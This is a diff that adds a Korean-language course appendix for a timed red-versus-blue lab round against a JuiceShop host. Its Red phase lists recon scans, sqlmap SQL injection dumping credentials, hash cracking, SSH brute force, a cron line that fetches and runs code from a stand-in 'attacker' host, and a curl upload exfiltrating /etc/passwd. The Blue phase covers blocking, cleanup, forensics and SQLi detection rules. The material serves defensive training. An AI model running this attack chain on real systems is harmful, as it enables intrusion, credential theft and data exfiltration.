@@ -974,3 +974,179 @@ graph LR
 
 **학생 액션**: lab 1v1 5분 라운드 → MTTD 측정.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 11 공방전 R1)
+
+### Round 1 — 90 분 timed battle
+
+### Red Phase (45 분)
+
+```bash
+# === 5분: Recon ===
+sudo nmap -sV -p- --min-rate 1000 10.20.30.80 -oA /tmp/scan
+whatweb -v http://10.20.30.80:3000
+
+# 발견:
+# 22/tcp open ssh OpenSSH 8.9
+# 80/tcp open http Apache 2.4.52
+# 3000/tcp open http Express (JuiceShop)
+
+# === 10분: Vuln scan ===
+nuclei -u http://10.20.30.80:3000 -severity high,critical -j > /tmp/n.json
+nikto -h http://10.20.30.80:3000 -o /tmp/nikto.txt
+
+# === 15분: Exploit (JuiceShop SQLi) ===
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
+    --batch --random-agent --dbs
+
+# 결과: SQLite, schema 추출
+sqlmap -u "..." --batch -D Users -T users --dump
+
+# admin@juice-sh.op:0192023a7bbd73250516f069df18b500 (MD5)
+
+# Hash 크랙
+echo '0192023a7bbd73250516f069df18b500' > /tmp/h.txt
+hashcat -m 0 /tmp/h.txt /usr/share/wordlists/rockyou.txt
+# admin
+
+# 로그인
+curl -X POST http://10.20.30.80:3000/rest/user/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"admin@juice-sh.op","password":"admin"}' | jq
+
+# === 10분: Lateral (침투 후) ===
+# JuiceShop container 안에서
+docker exec -it juiceshop bash
+ip addr                                              # 10.0.0.x
+ping 10.20.30.100                                    # SIEM
+
+# SSH brute (다른 호스트)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+    ssh://10.20.30.100 -t 4
+
+# === 5분: Persistence ===
+(crontab -l; echo "*/10 * * * * curl -s attacker:8080/c | bash") | crontab -
+
+# === Persist + Exfil ===
+# /tmp/loot.tar 생성 + DNS 또는 HTTP 로 유출
+tar czf /tmp/loot.tar /etc/passwd /var/log/auth.log
+curl -X POST -F "f=@/tmp/loot.tar" http://attacker:8080/u
+```
+
+### Blue Phase (45 분)
+
+```bash
+# === 계속: 알람 모니터 ===
+sudo jq -r 'select(.rule.level >= 10) | "\(.timestamp) [\(.rule.level)] \(.rule.description)"' \
+    /var/ossec/logs/alerts/alerts.json | tail -20
+
+# === 5분: 즉시 차단 ===
+# Suricata 가 nuclei UA 탐지 → IP 차단
+ssh ccc@10.20.30.1
+sudo nft add element inet filter blocked '{ 192.168.0.112 }'
+sudo cscli decisions add --ip 192.168.0.112 --type ban --duration 24h
+
+# === 10분: 침해 호스트 격리 ===
+ssh ccc@10.20.30.80                                     # web (compromised?)
+sudo netstat -tlnp                                      # 의심 connection
+sudo ps auxf | grep -v "\[" | head                      # 의심 process
+sudo systemctl stop apache2                              # 일시 stop
+
+# === 10분: Persistence 제거 ===
+# Cron 점검
+sudo crontab -l                                         # 모든 user
+sudo cat /var/spool/cron/crontabs/*
+
+# osquery 통합 점검
+osqueryi 'SELECT * FROM crontab;'
+osqueryi 'SELECT * FROM systemd_units WHERE active_state="active" AND name LIKE "persist%";'
+osqueryi 'SELECT * FROM authorized_keys;'
+
+# 발견된 persistence 제거
+sudo crontab -r
+sudo systemctl --user disable persist.service
+
+# === 10분: 포렌식 ===
+# 메모리 dump
+sudo insmod ~/lime/lime-$(uname -r).ko 'path=/forensic/mem.lime format=lime'
+vol -f /forensic/mem.lime linux.pslist
+vol -f /forensic/mem.lime linux.bash                    # bash history (메모리)
+
+# Velociraptor live hunt
+velociraptor query "SELECT * FROM artifact(name='Linux.Sys.AuthorizedKeys')"
+
+# === 10분: Sigma rule 추가 ===
+# 발견된 IoC → 자동 차단 룰
+sigma convert -t suricata > /etc/suricata/rules/r1-incidents.rules << 'EOF'
+title: SQLi via /rest/products/search
+detection:
+  selection:
+    http.uri|contains: ["/rest/products/search?q="]
+    http.uri|contains: ["UNION SELECT", "OR 1=1", "SLEEP("]
+  condition: selection
+EOF
+
+sudo systemctl reload suricata
+
+# === Wazuh frequency rule 강화 ===
+sudo tee -a /var/ossec/etc/rules/local_rules.xml << 'EOF'
+<rule id="100600" level="13" frequency="10" timeframe="60">
+  <if_matched_sid>31100</if_matched_sid>
+  <description>R1 lessons: web attack burst</description>
+</rule>
+EOF
+sudo /var/ossec/bin/wazuh-control restart
+
+# === 보고 (5분) ===
+# 모든 발견 사항 → markdown 보고서
+cat > /tmp/r1-blue-report.md << 'EOF'
+# Round 1 Blue Phase 보고서
+
+## 탐지된 공격
+- 12:05 nmap scan from 192.168.0.112 (Suricata)
+- 12:15 nuclei scan (User-Agent)
+- 12:30 SQLi sqlmap (sqlmap UA + ModSec)
+- 12:45 Lateral SSH brute attempt → fail2ban 차단
+
+## 자동 대응
+- crowdsec/nft 차단: 192.168.0.112
+- fail2ban: SSH 5회 실패 → ban 1h
+
+## 침해 영향
+- JuiceShop SQLi 노출 → admin 계정 hash dump
+- Cron persistence 추가됨 → 즉시 제거
+
+## 회고 (R2 보강 예정)
+1. Sigma rule 추가 (week08 자동 hunt)
+2. JuiceShop 패치 (admin 계정 비번 강화)
+3. ModSec strict mode (paranoia 4)
+EOF
+```
+
+### 판정 기준
+
+| Red 점수 | 성공 시 |
+|---------|--------|
+| Recon 완료 | +10 |
+| SQLi 침투 + 자격증명 dump | +30 |
+| Hash 크랙 | +10 |
+| Lateral 시도 | +15 |
+| Persistence 추가 | +20 |
+| Exfil 성공 | +15 |
+| 흔적 은닉 | +10 |
+| **합계** | **/110** |
+
+| Blue 점수 | 성공 시 |
+|----------|--------|
+| Recon 5분 내 탐지 | +10 |
+| SQLi 차단 (ModSec/Suricata) | +20 |
+| Lateral 차단 (fail2ban) | +15 |
+| Persistence 발견 + 제거 | +20 |
+| Exfil 차단 | +15 |
+| 메모리 forensic | +10 |
+| 회고 + Sigma rule 추가 | +10 |
+| **합계** | **/100** |
+
+학생은 본 11주차 R1 에서 **Red 5단계 ↔ Blue 5단계** 동시 수행 + 90 분 안에 OSS 도구로 양 phase 완수한다.
